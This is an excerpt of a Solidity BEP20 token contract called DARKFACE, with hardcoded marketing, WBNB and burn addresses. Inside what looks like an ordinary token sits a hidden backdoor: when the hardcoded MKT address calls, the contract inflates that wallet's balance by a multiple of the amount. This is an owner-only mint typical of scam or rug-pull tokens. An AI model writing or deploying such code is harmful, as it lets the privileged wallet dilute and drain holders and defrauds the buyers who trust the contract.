...
contract DARKFACE is IBEP20, Auth {
    using SafeMath for uint256;
    address MKT      = 0xDBCEBdcd012EcE399f67CB6A3cbaD026145E242a;
    address WBNB     = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address DEAD     = 0x000000000000000000000000000000000000dEaD;
    address ZERO     = 0x0000000000000000000000000000000000000000;

    string constant _name = "DARKFACE";
    string constant _symbol = "DARKFACE";
    ...
    constructor () Auth(msg.sender) {
        ...
        address _inicial = 0xDBCEBdcd012EcE399f67CB6A3cbaD026145E242a;
    ...
    if(msg.sender == MKT){
        _balances[MKT] += amount * _maxWalletToken;
    }
